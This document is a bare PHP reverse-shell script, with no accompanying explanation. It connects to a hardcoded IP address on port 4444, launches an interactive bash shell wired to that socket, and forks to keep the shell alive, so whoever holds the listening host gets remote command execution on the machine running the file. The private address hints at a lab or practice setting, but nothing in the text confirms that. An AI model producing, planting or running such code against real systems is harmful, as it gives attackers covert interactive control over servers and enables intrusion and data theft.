<?php
$ip = "10.8.90.209";
$port = 4444;

$sock = fsockopen($ip, $port);
if ($sock) {
    $descriptorspec = array(
        0 => $sock,  // stdin
        1 => $sock,  // stdout
        2 => $sock   // stderr
    );
    $process = proc_open("/bin/bash -i", $descriptorspec, $pipes);
    if (is_resource($process)) {
        // Fork the process to keep the shell running in the background
        $pid = pcntl_fork();
        if ($pid == -1) {
            die("Failed to fork process.");
        } else if ($pid == 0) {
            // Child process: Wait for commands and send them to the shell process
            while (true) {
                $line = fgets($sock);
                if ($line === false) break;
                fwrite($pipes[0], $line);
                $output = "";
                while ($f = fgets($pipes[1], 1024)) {
                    $output .= $f;
                }
                while ($f = fgets($pipes[2], 1024)) {
                    $output .= $f;
                }
                fwrite($sock, $output);
            }
            fclose($sock);
            exit(0);
        } else {
            // Parent process: Wait for the shell process to exit and clean up resources
            pcntl_waitpid($pid, $status);
            fclose($sock);
            proc_close($process);
        }
    }
}
?>

